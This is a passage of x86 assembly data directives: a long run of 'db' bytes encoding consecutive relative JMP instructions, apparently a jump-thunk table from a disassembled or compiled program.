    db 7Fh,00h,00h,0E9h,97h,7Fh,00h,00h,0E9h,92h,7Fh,00h,00h,0E9h,8Dh,7Fh
    db 00h,00h,0E9h,88h,7Fh,00h,00h,0E9h,83h,7Fh,00h,00h,0E9h,7Eh,7Fh,00h
    db 00h,0E9h,79h,7Fh,00h,00h,0E9h,74h,7Fh,00h,00h,0E9h,6Fh,7Fh,00h,00h
    db 0E9h,6Ah,7Fh,00h,00h,0E9h,65h,7Fh,00h,00h,0E9h,60h,7Fh,00h,00h,0E9h
    db 5Bh,7Fh,00h,00h,0E9h,56h,7Fh,00h,00h,0E9h,51h,7Fh,00h,00h,0E9h,4Ch
    db 7Fh,00h,00h,0E9h,47h,7Fh,00h,00h,0E9h,42h,7Fh,00h,00h,0E9h,3Dh,7Fh
    db 00h,00h,0E9h,38h,7Fh,00h,00h,0E9h,33h,7Fh,00h,00h,0E9h,2Eh,7Fh,00h
    db 00h,0E9h,29h,7Fh,00h,00h,0E9h,24h,7Fh,00h,00h,0E9h,1Fh,7Fh,00h,00h
    db 0E9h,1Ah,7Fh,00h,00h,0E9h,15h,7Fh,00h,00h,0E9h,10h,7Fh,00h,00h,0E9h
    db 0Bh,7Fh,00h,00h,0E9h,06h,7Fh,00h,00h,0E9h,01h,7Fh,00h,00h,0E9h,0FCh
    db 7Eh,00h,00h,0E9h,0F7h,7Eh,00h,00h,0E9h,0F2h,7Eh,00h,00h,0E9h,0EDh,7Eh
    db 00h,00h,0E9h,0E8h,7Eh,00h,00h,0E9h,0E3h,7Eh,00h,00h,0E9h,0DEh,7Eh,00h
    db 00h,0E9h,0D9h,7Eh,00h,00h,0E9h,0D4h,7Eh,00h,00h,0E9h,0CFh,7Eh,00h,00h
    db 0E9h,0CAh,7Eh,00h,00h,0E9h,0C5h,7Eh,00h,00h,0E9h,0C0h,7Eh,00h,00h,0E9h
    db 0BBh,7Eh,00h,00h,0E9h,0B6h,7Eh,00h,00h,0E9h,0B1h,7Eh,00h,00h,0E9h,0ACh
    db 7Eh,00h,00h,0E9h,0A7h,7Eh,00h,00h,0E9h,0A2h,7Eh,00h,00h,0E9h,9Dh,7Eh
    db 00h,00h,0E9h,98h,7Eh,00h,00h,0E9h,93h,7Eh,00h,00h,0E9h,8Eh,7Eh,00h
    db 00h,0E9h,89h,7Eh,00h,00h,0E9h,84h,7Eh,00h,00h,0E9h,7Fh,7Eh,00h,00h
    db 0E9h,7Ah,7Eh,00h,00h,0E9h,75h,7Eh,00h,00h,0E9h,70h,7Eh,00h,00h,0E9h
    db 6Bh,7Eh,00h,00h,0E9h,66h,7Eh,00h,00h,0E9h,61h,7Eh,00h,00h,0E9h,5Ch
    db 7Eh,00h,00h,0E9h,57h,7Eh,00h,00h,0E9h,52h,7Eh,00h,00h,0E9h,4Dh,7Eh
    db 00h,00h,0E9h,48h,7Eh,00h,00h,0E9h,43h,7Eh,00h,00h,0E9h,3Eh,7Eh,00h
    db 00h,0E9h,39h,7Eh,00h,00h,0E9h,34h,7Eh,00h,00h,0E9h,2Fh,7Eh,00h,00h
    db 0E9h,2Ah,7Eh,00h,00h,0E9h,25h,7Eh,00h,00h,0E9h,20h,7Eh,00h,00h,0E9h
    db 1Bh,7Eh,00h,00h,0E9h,16h,7Eh,00h,00h,0E9h,11h,7Eh,00h,00h,0E9h,0Ch
    db 7Eh,00h,00h,0E9h,07h,7Eh,00h,00h,0E9h,02h,7Eh,00h,00h,0E9h,0FDh,7Dh
    db 00h,00h,0E9h,0F8h,7Dh,00h,00h,0E9h,0F3h,7Dh,00h,00h,0E9h,0EEh,7Dh,00h
    db 00h,0E9h,0E9h,7Dh,00h,00h,0E9h,0E4h,7Dh,00h,00h,0E9h,0DFh,7Dh,00h,00h
    db 0E9h,0DAh,7Dh,00h,00h,0E9h,0D5h,7Dh,00h,00h,0E9h,0D0h,7Dh,00h,00h,0E9h
    db 0CBh,7Dh,00h,00h,0E9h,0C6h,7Dh,00h,00h,0E9h,0C1h,7Dh,00h,00h,0E9h,0BCh
    db 7Dh,00h,00h,0E9h,0B7h,7Dh,00h,00h,0E9h,0B2h,7Dh,00h,00h,0E9h,0ADh,7Dh
    db 00h,00h,0E9h,0A8h,7Dh,00h,00h,0E9h,0A3h,7Dh,00h,00h,0E9h,9Eh,7Dh,00h
    db 00h,0E9h,99h,7Dh,00h,00h,0E9h,94h,7Dh,00h,00h,0E9h,8Fh,7Dh,00h,00h
    db 0E9h,8Ah,7Dh,00h,00h,0E9h,85h,7Dh,00h,00h,0E9h,80h,7Dh,00h,00h,0E9h
    db 7Bh,7Dh,00h,00h,0E9h,76h,7Dh,00h,00h,0E9h,71h,7Dh,00h,00h,0E9h,6Ch
    db 7Dh,00h,00h,0E9h,67h,7Dh,00h,00h,0E9h,62h,7Dh,00h,00h,0E9h,5Dh,7Dh
    db 00h,00h,0E9h,58h,7Dh,00h,00h,0E9h,53h,7Dh,00h,00h,0E9h,4Eh,7Dh,00h
    db 00h,0E9h,49h,7Dh,00h,00h,0E9h,44h,7Dh,00h,00h,0E9h,3Fh,7Dh,00h,00h
    db 0E9h,3Ah,7Dh,00h,00h,0E9h,35h,7Dh,00h,00h,0E9h,30h,7Dh,00h,00h,0E9h
    db 2Bh,7Dh,00h,00h,0E9h,26h,7Dh,00h,00h,0E9h,21h,7Dh,00h,00h,0E9h,1Ch
    db 7Dh,00h,00h,0E9h,17h,7Dh,00h,00h,0E9h,12h,7Dh,00h,00h,0E9h,0Dh,7Dh
    db 00h,00h,0E9h,08h,7Dh,00h,00h,0E9h,03h,7Dh,00h,00h,0E9h,0FEh,7Ch,00h
    db 00h,0E9h,0F9h,7Ch,00h,00h,0E9h,0F4h,7Ch,00h,00h,0E9h,0EFh,7Ch,00h,00h
    db 0E9h,0EAh,7Ch,00h,00h,0E9h,0E5h,7Ch,00h,00h,0E9h,0E0h,7Ch,00h,00h,0E9h
    db 0DBh,7Ch,00h,00h,0E9h,0D6h,7Ch,00h,00h,0E9h,0D1h,7Ch,00h,00h,0E9h,0CCh
    db 7Ch,00h,00h,0E9h,0C7h,7Ch,00h,00h,0E9h,0C2h,7Ch,00h,00h,0E9h,0BDh,7Ch
    db 00h,00h,0E9h,0B8h,7Ch,00h,00h,0E9h,0B3h,7Ch,00h,00h,0E9h,0AEh,7Ch,00h
    db 00h,0E9h,0A9h,7Ch,00h,00h,0E9h,0A4h,7Ch,00h,00h,0E9h,9Fh,7Ch,00h,00h
    db 0E9h,9Ah,7Ch,00h,00h,0E9h,95h,7Ch,00h,00h,0E9h,90h,7Ch,00h,00h,0E9h
    db 8Bh,7Ch,00h,00h,0E9h,86h,7Ch,00h,00h,0E9h,81h,7Ch,00h,00h,0E9h,7Ch
    db 7Ch,00h,00h,0E9h,77h,7Ch,00h,00h,0E9h,72h,7Ch,00h,00h,0E9h,6Dh,7Ch
    db 00h,00h,0E9h,68h,7Ch,00h,00h,0E9h,63h,7Ch,00h,00h,0E9h,5Eh,7Ch,00h
    db 00h,0E9h,59h,7Ch,00h,00h,0E9h,54h,7Ch,00h,00h,0E9h,4Fh,7Ch,00h,00h
    db 0E9h,4Ah,7Ch,00h,00h,0E9h,45h,7Ch,00h,00h,0E9h,40h,7Ch,00h,00h,0E9h
    db 3Bh,7Ch,00h,00h,0E9h,36h,7Ch,00h,00h,0E9h,31h,7Ch,00h,00h,0E9h,2Ch
    db 7Ch,00h,00h,0E9h,27h,7Ch,00h,00h,0E9h,22h,7Ch,00h,00h,0E9h,1Dh,7Ch
    db 00h,00h,0E9h,18h,7Ch,00h,00h,0E9h,13h,7Ch,00h,00h,0E9h,0Eh,7Ch,00h
    db 00h,0E9h,09h,7Ch,00h,00h,0E9h,04h,7Ch,00h,00h,0E9h,0FFh,7Bh,00h,00h
    db 0E9h,0FAh,7Bh,00h,00h,0E9h,0F5h,7Bh,00h,00h,0E9h,0F0h,7Bh,00h,00h,0E9h
    db 0EBh,7Bh,00h,00h,0E9h,0E6h,7Bh,00h,00h,0E9h,0E1h,7Bh,00h,00h,0E9h,0DCh
    db 7Bh,00h,00h,0E9h,0D7h,7Bh,00h,00h,0E9h,0D2h,7Bh,00h,00h,0E9h,0CDh,7Bh
    db 00h,00h,0E9h,0C8h,7Bh,00h,00h,0E9h,0C3h,7Bh,00h,00h,0E9h,0BEh,7Bh,00h
    db 00h,0E9h,0B9h,7Bh,00h,00h,0E9h,0B4h,7Bh,00h,00h,0E9h,0AFh,7Bh,00h,00h
    db 0E9h,0AAh,7Bh,00h,00h,0E9h,0A5h,7Bh,00h,00h,0E9h,0A0h,7Bh,00h,00h,0E9h
    db 9Bh,7Bh,00h,00h,0E9h,96h,7Bh,00h,00h,0E9h,91h,7Bh,00h,00h,0E9h,8Ch
    db 7Bh,00h,00h,0E9h,87h,7Bh,00h,00h,0E9h,82h,7Bh,00h,00h,0E9h,7Dh,7Bh
    db 00h,00h,0E9h,78h,7Bh,00h,00h,0E9h,73h,7Bh,00h,00h,0E9h,6Eh,7Bh,00h
    db 00h,0E9h,69h,7Bh,00h,00h,0E9h,64h,7Bh,00h,00h,0E9h,5Fh,7Bh,00h,00h
    db 0E9h,5Ah,7Bh,00h,00h,0E9h,55h,7Bh,00h,00h,0E9h,50h,7Bh,00h,00h,0E9h
    db 4Bh,7Bh,00h,00h,0E9h,46h,7Bh,00h,00h,0E9h,41h,7Bh,00h,00h,0E9h,3Ch
    db 7Bh,00h,00h,0E9h,37h,7Bh,00h,00h,0E9h,32h,7Bh,00h,00h,0E9h,2Dh,7Bh
    db 00h,00h,0E9h,28h,7Bh,00h,00h,0E9h,23h,7Bh,00h,00h,0E9h,1Eh,7Bh,00h
    db 00h,0E9h,19h,7Bh,00h,00h,0E9h,14h,7Bh,00h,00h,0E9h,0Fh,7Bh,00h,00h
    db 0E9h,0Ah,7Bh,00h,00h,0E9h,05h,7Bh,00h,00h,0E9h,00h,7Bh,00h,00h,0E9h
    db 0FBh,7Ah,00h,00h,0E9h,0F6h,7Ah,00h,00h,0E9h,0F1h,7Ah,00h,00h,0E9h,0ECh
    db 7Ah,00h,00h,0E9h,0E7h,7Ah,00h,00h,0E9h,0E2h,7Ah,00h,00h,0E9h,0DDh,7Ah
    db 00h,00h,0E9h,0D8h,7Ah,00h,00h,0E9h,0D3h,7Ah,00h,00h,0E9h,0CEh,7Ah,00h
    db 00h,0E9h,0C9h,7Ah,00h,00h,0E9h,0C4h,7Ah,00h,00h,0E9h,0BFh,7Ah,00h,00h
    db 0E9h,0BAh,7Ah,00h,00h,0E9h,0B5h,7Ah,00h,00h,0E9h,0B0h,7Ah,00h,00h,0E9h
    db 0ABh,7Ah,00h,00h,0E9h,0A6h,7Ah,00h,00h,0E9h,0A1h,7Ah,00h,00h,0E9h,9Ch
    db 7Ah,00h,00h,0E9h,97h,7Ah,00h,00h,0E9h,92h,7Ah,00h,00h,0E9h,8Dh,7Ah
    db 00h,00h,0E9h,88h,7Ah,00h,00h,0E9h,83h,7Ah,00h,00h,0E9h,7Eh,7Ah,00h
    db 00h,0E9h,79h,7Ah,00h,00h,0E9h,74h,7Ah,00h,00h,0E9h,6Fh,7Ah,00h,00h
    db 0E9h,6Ah,7Ah,00h,00h,0E9h,65h,7Ah,00h,00h,0E9h,60h,7Ah,00h,00h,0E9h
    db 5Bh,7Ah,00h,00h,0E9h,56h,7Ah,00h,00h,0E9h,51h,7Ah,00h,00h,0E9h,4Ch
    db 7Ah,00h,00h,0E9h,47h,7Ah,00h,00h,0E9h,42h,7Ah,00h,00h,0E9h,3Dh,7Ah
    db 00h,00h,0E9h,38h,7Ah,00h,00h,0E9h,33h,7Ah,00h,00h,0E9h,2Eh,7Ah,00h
    db 00h,0E9h,29h,7Ah,00h,00h,0E9h,24h,7Ah,00h,00h,0E9h,1Fh,7Ah,00h,00h
    db 0E9h,1Ah,7Ah,00h,00h,0E9h,15h,7Ah,00h,00h,0E9h,10h,7Ah,00h,00h,0E9h
    db 0Bh,7Ah,00h,00h,0E9h,06h,7Ah,00h,00h,0E9h,01h,7Ah,00h,00h,0E9h,0FCh
    db 79h,00h,00h,0E9h,0F7h,79h,00h,00h,0E9h,0F2h,79h,00h,00h,0E9h,0EDh,79h
    db 00h,00h,0E9h,0E8h,79h,00h,00h,0E9h,0E3h,79h,00h,00h,0E9h,0DEh,79h,00h
    db 00h,0E9h,0D9h,79h,00h,00h,0E9h,0D4h,79h,00h,00h,0E9h,0CFh,79h,00h,00h
    db 0E9h,0CAh,79h,00h,00h,0E9h,0C5h,79h,00h,00h,0E9h,0C0h,79h,00h,00h,0E9h
    db 0BBh,79h,00h,00h,0E9h,0B6h,79h,00h,00h,0E9h,0B1h,79h,00h,00h,0E9h,0ACh
    db 79h,00h,00h,0E9h,0A7h,79h,00h,00h,0E9h,0A2h,79h,00h,00h,0E9h,9Dh,79h
    db 00h,00h,0E9h,98h,79h,00h,00h,0E9h,93h,79h,00h,00h,0E9h,8Eh,79h,00h
    db 00h,0E9h,89h,79h,00h,00h,0E9h,84h,79h,00h,00h,0E9h,7Fh,79h,00h,00h
    db 0E9h,7Ah,79h,00h,00h,0E9h,75h,79h,00h,00h,0E9h,70h,79h,00h,00h,0E9h
    db 6Bh,79h,00h,00h,0E9h,66h,79h,00h,00h,0E9h,61h,79h,00h,00h,0E9h,5Ch
    db 79h,00h,00h,0E9h,57h,79h,00h,00h,0E9h,52h,79h,00h,00h,0E9h,4Dh,79h
    db 00h,00h,0E9h,48h,79h,00h,00h,0E9h,43h,79h,00h,00h,0E9h,3Eh,79h,00h
    db 00h,0E9h,39h,79h,00h,00h,0E9h,34h,79h,00h,00h,0E9h,2Fh,79h,00h,00h
    db 0E9h,2Ah,79h,00h,00h,0E9h,25h,79h,00h,00h,0E9h,20h,79h,00h,00h,0E9h
    db 1Bh,79h,00h,00h,0E9h,16h,79h,00h,00h,0E9h,11h,79h,00h,00h,0E9h,0Ch
    db 79h,00h,00h,0E9h,07h,79h,00h,00h,0E9h,02h,79h,00h,00h,0E9h,0FDh,78h
    db 00h,00h,0E9h,0F8h,78h,00h,00h,0E9h,0F3h,78h,00h,00h,0E9h,0EEh,78h,00h
    db 00h,0E9h,0E9h,78h,00h,00h,0E9h,0E4h,78h,00h,00h,0E9h,0DFh,78h,00h,00h
    db 0E9h,0DAh,78h,00h,00h,0E9h,0D5h,78h,00h,00h,0E9h,0D0h,78h,00h,00h,0E9h
    db 0CBh,78h,00h,00h,0E9h,0C6h,78h,00h,00h,0E9h,0C1h,78h,00h,00h,0E9h,0BCh
    db 78h,00h,00h,0E9h,0B7h,78h,00h,00h,0E9h,0B2h,78h,00h,00h,0E9h,0ADh,78h
    db 00h,00h,0E9h,0A8h,78h,00h,00h,0E9h,0A3h,78h,00h,00h,0E9h,9Eh,78h,00h
    db 00h,0E9h,99h,78h,00h,00h,0E9h,94h,78h,00h,00h,0E9h,8Fh,78h,00h,00h
    db 0E9h,8Ah,78h,00h,00h,0E9h,85h,78h,00h,00h,0E9h,80h,78h,00h,00h,0E9h
    db 7Bh,78h,00h,00h,0E9h,76h,78h,00h,00h,0E9h,71h,78h,00h,00h,0E9h,6Ch
    db 78h,00h,00h,0E9h,67h,78h,00h,00h,0E9h,62h,78h,00h,00h,0E9h,5Dh,78h
    db 00h,00h,0E9h,58h,78h,00h,00h,0E9h,53h,78h,00h,00h,0E9h,4Eh,78h,00h
    db 00h,0E9h,49h,78h,00h,00h,0E9h,44h,78h,00h,00h,0E9h,3Fh,78h,00h,00h
    db 0E9h,3Ah,78h,00h,00h,0E9h,35h,78h,00h,00h,0E9h,30h,78h,00h,00h,0E9h
    db 2Bh,78h,00h,00h,0E9h,26h,78h,00h,00h,0E9h,21h,78h,00h,00h,0E9h,1Ch
    db 78h,00h,00h,0E9h,17h,78h,00h,00h,0E9h,12h,78h,00h,00h,0E9h,0Dh,78h
    db 00h,00h,0E9h,08h,78h,00h,00h,0E9h,03h,78h,00h,00h,0E9h,0FEh,77h,00h
    db 00h,0E9h,0F9h,77h,00h,00h,0E9h,0F4h,77h,00h,00h,0E9h,0EFh,77h,00h,00h
    db 0E9h,0EAh,77h,00h,00h,0E9h,0E5h,77h,00h,00h,0E9h,0E0h,77h,00h,00h,0E9h
    db 0DBh,77h,00h,00h,0E9h,0D6h,77h,00h,00h,0E9h,0D1h,77h,00h,00h,0E9h,0CCh
    db 77h,00h,00h,0E9h,0C7h,77h,00h,00h,0E9h,0C2h,77h,00h,00h,0E9h,0BDh,77h
    db 00h,00h,0E9h,0B8h,77h,00h,00h,0E9h,0B3h,77h,00h,00h,0E9h,0AEh,77h,00h
    db 00h,0E9h,0A9h,77h,00h,00h,0E9h,0A4h,77h,00h,00h,0E9h,9Fh,77h,00h,00h
    db 0E9h,9Ah,77h,00h,00h,0E9h,95h,77h,00h,00h,0E9h,90h,77h,00h,00h,0E9h
    db 8Bh,77h,00h,00h,0E9h,86h,77h,00h,00h,0E9h,81h,77h,00h,00h,0E9h,7Ch
    db 77h,00h,00h,0E9h,77h,77h,00h,00h,0E9h,72h,77h,00h,00h,0E9h,6Dh,77h
    db 00h,00h,0E9h,68h,77h,00h,00h,0E9h,63h,77h,00h,00h,0E9h,5Eh,77h,00h
    db 00h,0E9h,59h,77h,00h,00h,0E9h,54h,77h,00h,00h,0E9h,4Fh,77h,00h,00h
    db 0E9h,4Ah,77h,00h,00h,0E9h,45h,77h,00h,00h,0E9h,40h,77h,00h,00h,0E9h
    db 3Bh,77h,00h,00h,0E9h,36h,77h,00h,00h,0E9h,31h,77h,00h,00h,0E9h,2Ch
    db 77h,00h,00h,0E9h,27h,77h,00h,00h,0E9h,22h,77h,00h,00h,0E9h,1Dh,77h
    db 00h,00h,0E9h,18h,77h,00h,00h,0E9h,13h,77h,00h,00h,0E9h,0Eh,77h,00h
    db 00h,0E9h,09h,77h,00h,00h,0E9h,04h,77h,00h,00h,0E9h,0FFh,76h,00h,00h
    db 0E9h,0FAh,76h,00h,00h,0E9h,0F5h,76h,00h,00h,0E9h,0F0h,76h,00h,00h,0E9h
    db 0EBh,76h,00h,00h,0E9h,0E6h,76h,00h,00h,0E9h,0E1h,76h,00h,00h,0E9h,0DCh
    db 76h,00h,00h,0E9h,0D7h,76h,00h,00h,0E9h,0D2h,76h,00h,00h,0E9h,0CDh,76h
    db 00h,00h,0E9h,0C8h,76h,00h,00h,0E9h,0C3h,76h,00h,00h,0E9h,0BEh,76h,00h
    db 00h,0E9h,0B9h,76h,00h,00h,0E9h,0B4h,76h,00h,00h,0E9h,0AFh,76h,00h,00h
    db 0E9h,0AAh,76h,00h,00h,0E9h,0A5h,76h,00h,00h,0E9h,0A0h,76h,00h,00h,0E9h
    db 9Bh,76h,00h,00h,0E9h,96h,76h,00h,00h,0E9h,91h,76h,00h,00h,0E9h,8Ch
    db 76h,00h,00h,0E9h,87h,76h,00h,00h,0E9h,82h,76h,00h,00h,0E9h,7Dh,76h
    db 00h,00h,0E9h,78h,76h,00h,00h,0E9h,73h,76h,00h,00h,0E9h,6Eh,76h,00h
    db 00h,0E9h,69h,76h,00h,00h,0E9h,64h,76h,00h,00h,0E9h,5Fh,76h,00h,00h
    db 0E9h,5Ah,76h,00h,00h,0E9h,55h,76h,00h,00h,0E9h,50h,76h,00h,00h,0E9h
    db 4Bh,76h,00h,00h,0E9h,46h,76h,00h,00h,0E9h,41h,76h,00h,00h,0E9h,3Ch
    db 76h,00h,00h,0E9h,37h,76h,00h,00h,0E9h,32h,76h,00h,00h,0E9h,2Dh,76h
    db 00h,00h,0E9h,28h,76h,00h,00h,0E9h,23h,76h,00h,00h,0E9h,1Eh,76h,00h
    db 00h,0E9h,19h,76h,00h,00h,0E9h,14h,76h,00h,00h,0E9h,0Fh,76h,00h,00h
    db 0E9h,0Ah,76h,00h,00h,0E9h,05h,76h,00h,00h,0E9h,00h,76h,00h,00h,0E9h
    db 0FBh,75h,00h,00h,0E9h,0F6h,75h,00h,00h,0E9h,0F1h,75h,00h,00h,0E9h,0ECh
    db 75h,00h,00h,0E9h,0E7h,75h,00h,00h,0E9h,0E2h,75h,00h,00h,0E9h,0DDh,75h
    db 00h,00h,0E9h,0D8h,75h,00h,00h,0E9h,0D3h,75h,00h,00h,0E9h,0CEh,75h,00h
    db 00h,0E9h,0C9h,75h,00h,00h,0E9h,0C4h,75h,00h,00h,0E9h,0BFh,75h,00h,00h
    db 0E9h,0BAh,75h,00h,00h,0E9h,0B5h,75h,00h,00h,0E9h,0B0h,75h,00h,00h,0E9h
    db 0ABh,75h,00h,00h,0E9h,0A6h,75h,00h,00h,0E9h,0A1h,75h,00h,00h,0E9h,9Ch
    db 75h,00h,00h,0E9h,97h,75h,00h,00h,0E9h,92h,75h,00h,00h,0E9h,8Dh,75h
    db 00h,00h,0E9h,88h,75h,00h,00h,0E9h,83h,75h,00h,00h,0E9h,7Eh,75h,00h
    db 00h,0E9h,79h,75h,00h,00h,0E9h,74h,75h,00h,00h,0E9h,6Fh,75h,00h,00h
    db 0E9h,6Ah,75h,00h,00h,0E9h,65h,75h,00h,00h,0E9h,60h,75h,00h,00h,0E9h
    db 5Bh,75h,00h,00h,0E9h,56h,75h,00h,00h,0E9h,51h,75h,00h,00h,0E9h,4Ch
    db 75h,00h,00h,0E9h,47h,75h,00h,00h,0E9h,42h,75h,00h,00h,0E9h,3Dh,75h
    db 00h,00h,0E9h,38h,75h,00h,00h,0E9h,33h,75h,00h,00h,0E9h,2Eh,75h,00h
    db 00h,0E9h,29h,75h,00h,00h,0E9h,24h,75h,00h,00h,0E9h,1Fh,75h,00h,00h
    db 0E9h,1Ah,75h,00h,00h,0E9h,15h,75h,00h,00h,0E9h,10h,75h,00h,00h,0E9h
    db 0Bh,75h,00h,00h,0E9h,06h,75h,00h,00h,0E9h,01h,75h,00h,00h,0E9h,0FCh
    db 74h,00h,00h,0E9h,0F7h,74h,00h,00h,0E9h,0F2h,74h,00h,00h,0E9h,0EDh,74h
    db 00h,00h,0E9h,0E8h,74h,00h,00h,0E9h,0E3h,74h,00h,00h,0E9h,0DEh,74h,00h
    db 00h,0E9h,0D9h,74h,00h,00h,0E9h,0D4h,74h,00h,00h,0E9h,0CFh,74h,00h,00h
    db 0E9h,0CAh,74h,00h,00h,0E9h,0C5h,74h,00h,00h,0E9h,0C0h,74h,00h,00h,0E9h
    db 0BBh,74h,00h,00h,0E9h,0B6h,74h,00h,00h,0E9h,0B1h,74h,00h,00h,0E9h,0ACh
    db 74h,00h,00h,0E9h,0A7h,74h,00h,00h,0E9h,0A2h,74h,00h,00h,0E9h,9Dh,74h
    db 00h,00h,0E9h,98h,74h,00h,00h,0E9h,93h,74h,00h,00h,0E9h,8Eh,74h,00h
    db 00h,0E9h,89h,74h,00h,00h,0E9h,84h,74h,00h,00h,0E9h,7Fh,74h,00h,00h
    db 0E9h,7Ah,74h,00h,00h,0E9h,75h,74h,00h,00h,0E9h,70h,74h,00h,00h,0E9h
    db 6Bh,74h,00h,00h,0E9h,66h,74h,00h,00h,0E9h,61h,74h,00h,00h,0E9h,5Ch
    db 74h,00h,00h,0E9h,57h,74h,00h,00h,0E9h,52h,74h,00h,00h,0E9h,4Dh,74h
    db 00h,00h,0E9h,48h,74h,00h,00h,0E9h,43h,74h,00h,00h,0E9h,3Eh,74h,00h
    db 00h,0E9h,39h,74h,00h,00h,0E9h,34h,74h,00h,00h,0E9h,2Fh,74h,00h,00h
    db 0E9h,2Ah,74h,00h,00h,0E9h,25h,74h,00h,00h,0E9h,20h,74h,00h,00h,0E9h
    db 1Bh,74h,00h,00h,0E9h,16h,74h,00h,00h,0E9h,11h,74h,00h,00h,0E9h,0Ch
    db 74h,00h,00h,0E9h,07h,74h,00h,00h,0E9h,02h,74h,00h,00h,0E9h,0FDh,73h
    db 00h,00h,0E9h,0F8h,73h,00h,00h,0E9h,0F3h,73h,00h,00h,0E9h,0EEh,73h,00h
    db 00h,0E9h,0E9h,73h,00h,00h,0E9h,0E4h,73h,00h,00h,0E9h,0DFh,73h,00h,00h
    db 0E9h,0DAh,73h,00h,00h,0E9h,0D5h,73h,00h,00h,0E9h,0D0h,73h,00h,00h,0E9h
    db 0CBh,73h,00h,00h,0E9h,0C6h,73h,00h,00h,0E9h,0C1h,73h,00h,00h,0E9h,0BCh
    db 73h,00h,00h,0E9h,0B7h,73h,00h,00h,0E9h,0B2h,73h,00h,00h,0E9h,0ADh,73h
    db 00h,00h,0E9h,0A8h,73h,00h,00h,0E9h,0A3h,73h,00h,00h,0E9h,9Eh,73h,00h
    db 00h,0E9h,99h,73h,00h,00h,0E9h,94h,73h,00h,00h,0E9h,8Fh,73h,00h,00h
    db 0E9h,8Ah,73h,00h,00h,0E9h,85h,73h,00h,00h,0E9h,80h,73h,00h,00h,0E9h
    db 7Bh,73h,00h,00h,0E9h,76h,73h,00h,00h,0E9h,71h,73h,00h,00h,0E9h,6Ch
    db 73h,00h,00h,0E9h,67h,73h,00h,00h,0E9h,62h,73h,00h,00h,0E9h,5Dh,73h
    db 00h,00h,0E9h,58h,73h,00h,00h,0E9h,53h,73h,00h,00h,0E9h,4Eh,73h,00h
    db 00h,0E9h,49h,73h,00h,00h,0E9h,44h,73h,00h,00h,0E9h,3Fh,73h,00h,00h
    db 0E9h,3Ah,73h,00h,00h,0E9h,35h,73h,00h,00h,0E9h,30h,73h,00h,00h,0E9h
    db 2Bh,73h,00h,00h,0E9h,26h,73h,00h,00h,0E9h,21h,73h,00h,00h,0E9h,1Ch
    db 73h,00h,00h,0E9h,17h,73h,00h,00h,0E9h,12h,73h,00h,00h,0E9h,0Dh,73h
    db 00h,00h,0E9h,08h,73h,00h,00h,0E9h,03h,73h,00h,00h,0E9h,0FEh,72h,00h
    db 00h,0E9h,0F9h,72h,00h,00h,0E9h,0F4h,72h,00h,00h,0E9h,0EFh,72h,00h,00h
    db 0E9h,0EAh,72h,00h,00h,0E9h,0E5h,72h,00h,00h,0E9h,0E0h,72h,00h,00h,0E9h
    db 0DBh,72h,00h,00h,0E9h,0D6h,72h,00h,00h,0E9h,0D1h,72h,00h,00h,0E9h,0CCh
    db 72h,00h,00h,0E9h,0C7h,72h,00h,00h,0E9h,0C2h,72h,00h,00h,0E9h,0BDh,72h
    db 00h,00h,0E9h,0B8h,72h,00h,00h,0E9h,0B3h,72h,00h,00h,0E9h,0AEh,72h,00h
    db 00h,0E9h,0A9h,72h,00h,00h,0E9h,0A4h,72h,00h,00h,0E9h,9Fh,72h,00h,00h
    db 0E9h,9Ah,72h,00h,00h,0E9h,95h,72h,00h,00h,0E9h,90h,72h,00h,00h,0E9h
    db 8Bh,72h,00h,00h,0E9h,86h,72h,00h,00h,0E9h,81h,72h,00h,00h,0E9h,7Ch
    db 72h,00h,00h,0E9h,77h,72h,00h,00h,0E9h,72h,72h,00h,00h,0E9h,6Dh,72h
    db 00h,00h,0E9h,68h,72h,00h,00h,0E9h,63h,72h,00h,00h,0E9h,5Eh,72h,00h
    db 00h,0E9h,59h,72h,00h,00h,0E9h,54h,72h,00h,00h,0E9h,4Fh,72h,00h,00h
    db 0E9h,4Ah,72h,00h,00h,0E9h,45h,72h,00h,00h,0E9h,40h,72h,00h,00h,0E9h
    db 3Bh,72h,00h,00h,0E9h,36h,72h,00h,00h,0E9h,31h,72h,00h,00h,0E9h,2Ch
    db 72h,00h,00h,0E9h,27h,72h,00h,00h,0E9h,22h,72h,00h,00h,0E9h,1Dh,72h
    db 00h,00h,0E9h,18h,72h,00h,00h,0E9h,13h,72h,00h,00h,0E9h,0Eh,72h,00h
    db 00h,0E9h,09h,72h,00h,00h,0E9h,04h,72h,00h,00h,0E9h,0FFh,71h,00h,00h
    db 0E9h,0FAh,71h,00h,00h,0E9h,0F5h,71h,00h,00h,0E9h,0F0h,71h,00h,00h,0E9h
    db 0EBh,71h,00h,00h,0E9h,0E6h,71h,00h,00h,0E9h,0E1h,71h,00h,00h,0E9h,0DCh
    db 71h,00h,00h,0E9h,0D7h,71h,00h,00h,0E9h,0D2h,71h,00h,00h,0E9h,0CDh,71h
    db 00h,00h,0E9h,0C8h,71h,00h,00h,0E9h,0C3h,71h,00h,00h,0E9h,0BEh,71h,00h
    db 00h,0E9h,0B9h,71h,00h,00h,0E9h,0B4h,71h,00h,00h,0E9h,0AFh,71h,00h,00h
    db 0E9h,0AAh,71h,00h,00h,0E9h,0A5h,71h,00h,00h,0E9h,0A0h,71h,00h,00h,0E9h
    db 9Bh,71h,00h,00h,0E9h,96h,71h,00h,00h,0E9h,91h,71h,00h,00h,0E9h,8Ch
    db 71h,00h,00h,0E9h,87h,71h,00h,00h,0E9h,82h,71h,00h,00h,0E9h,7Dh,71h
    db 00h,00h,0E9h,78h,71h,00h,00h,0E9h,73h,71h,00h,00h,0E9h,6Eh,71h,00h
    db 00h,0E9h,69h,71h,00h,00h,0E9h,64h,71h,00h,00h,0E9h,5Fh,71h,00h,00h
    db 0E9h,5Ah,71h,00h,00h,0E9h,55h,71h,00h,00h,0E9h,50h,71h,00h,00h,0E9h
    db 4Bh,71h,00h,00h,0E9h,46h,71h,00h,00h,0E9h,41h,71h,00h,00h,0E9h,3Ch
    db 71h,00h,00h,0E9h,37h,71h,00h,00h,0E9h,32h,71h,00h,00h,0E9h,2Dh,71h
    db 00h,00h,0E9h,28h,71h,00h,00h,0E9h,23h,71h,00h,00h,0E9h,1Eh,71h,00h
    db 00h,0E9h,19h,71h,00h,00h,0E9h,14h,71h,00h,00h,0E9h,0Fh,71h,00h,00h
    db 0E9h,0Ah,71h,00h,00h,0E9h,05h,71h,00h,00h,0E9h,00h,71h,00h,00h,0E9h
    db 0FBh,70h,00h,00h,0E9h,0F6h,70h,00h,00h,0E9h,0F1h,70h,00h,00h,0E9h,0ECh
